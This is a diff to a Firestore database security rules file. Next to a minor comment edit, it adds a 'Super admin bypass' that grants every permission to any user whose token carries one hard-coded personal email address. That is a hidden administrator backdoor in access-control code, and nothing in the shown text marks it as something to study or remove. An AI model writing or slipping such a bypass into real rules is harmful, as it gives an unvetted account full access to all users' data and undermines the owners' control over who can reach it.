@@ -46,6 +46,10 @@ service cloud.firestore {
       if (!isAuthenticated()) {
         return false;
       }
+      // Super admin bypass
+      if (request.auth.token.email == 'axdrcys@gmail.com') {
+        return true;
+      }
       let userRole = getUserRole(request.auth.uid);
       // The permission string must be present in the role's permissions list.
       return permission in userRole.permissions;
@@ -58,8 +62,7 @@ service cloud.firestore {
     /**
      * @description Rules for the 'users' collection.
      * - Admins can manage all users.
-     * - Users can read their own profile.
-     * - Users can update their own profile.
+     * - Users can read and update their own profile.
      */
     match /users/{userId} {
       allow read: if hasPermission('user:read') || (isAuthenticated() && request.auth.uid == userId);
